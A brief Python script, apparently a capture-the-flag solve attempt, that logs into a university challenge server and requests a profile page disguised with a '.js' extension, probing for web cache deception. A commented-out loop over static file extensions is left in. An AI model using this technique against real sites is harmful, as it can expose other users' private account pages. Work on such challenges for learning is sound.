from requests import Session

s = Session()
base = 'http://cyberchallenge.disi.unitn.it:7901'

res = s.post(base + '/login', {'username': 'qwertys', 'password': 'qazxcvbnm'}, allow_redirects=False)
assert res.status_code == 301, res.status_code

extensions = 'js|css|png|jpg|jpeg|gif|ico|svg'.split('|')

# for ext in extensions:

path = f'/profile.js?a=100'
res = s.get(base + path)
print(path)
print(res.text)
print(res.status_code)
print(res.headers)

